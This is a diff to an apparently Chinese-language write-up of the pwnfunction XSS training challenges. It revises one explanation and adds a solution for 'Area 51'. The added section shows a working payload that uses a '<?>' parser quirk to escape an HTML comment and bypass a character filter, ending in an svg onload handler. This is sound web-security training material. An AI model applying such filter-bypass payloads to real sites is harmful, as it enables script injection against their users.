@@ -23,7 +23,8 @@
 **问题分析**
 
 Client side script 将URL中的somebody参数作为**spaghet**的innerHTML。因此，只要构造一个合法的HTML标签来触发Javascript代码即可。
-由于\<script\>标签不能作为headings的子节点，这里可以考虑使用\<svg\>或者img标签。
+由于浏览器解析顺序是自上而下，先执行javascript，然后再渲染HTML。如果向spaghet.innerHTML中插入\<script\>标签，则不能自动执行，这里
+可以考虑使用\<svg\>或者\<img\>标签。
 
 **答案**
 
@@ -259,3 +260,44 @@ https://github.com/cure53/DOMPurify/blob/main/README.md
 **答案**
 
 如上文代码。
+
+
+### 9. Area 51
+
+题目链接：https://xss.pwnfunction.com/challenges/area-51/
+
+```html
+<!-- Challenge -->
+<div id="pwnme"></div>
+
+<script>
+    var input = (new URL(location).searchParams.get('debug') || '').replace(/[\!\-\/\#\&\;\%]/g, '_');
+    var template = document.createElement('template');
+    template.innerHTML = input;
+    pwnme.innerHTML = "<!-- <p> DEBUG: " + template.outerHTML + " </p> -->";
+</script>
+```
+
+**问题分析**
+
+代码对用户输入做了过滤，！、-、#、&、；、% 都被过滤掉了，因此既不能做 HTML Entities 编码，也不能做 URL Encoding。
+难点在于如何 break 掉之前的注释，否则用户的输入会注入到注释中，不会被浏览器执行。
+
+[HTML标准中的tag-open-state](https://www.w3.org/TR/html52/syntax.html#tag-open-state)
+篇提到，如果遇到 Question Mark (?) 则视为解析错误，浏览器应该创建一个内容为空的 comment token。
+
+测试一下，输入如下代码作为参数：
+```html
+<?>test
+```
+查看返回页面的源代码，可以看到 \<?\> 已经变成了 \<!--?--\>，在 test 之前成功注入了一个 comment 的终止标记。
+```html
+<div id="pwnme"><!-- <p> DEBUG: <template><!--?-->test <p></p> --&gt;</div>
+```
+
+**答案**
+
+
+```html
+<?><svg onload="alert(1337)"></svg>
+```
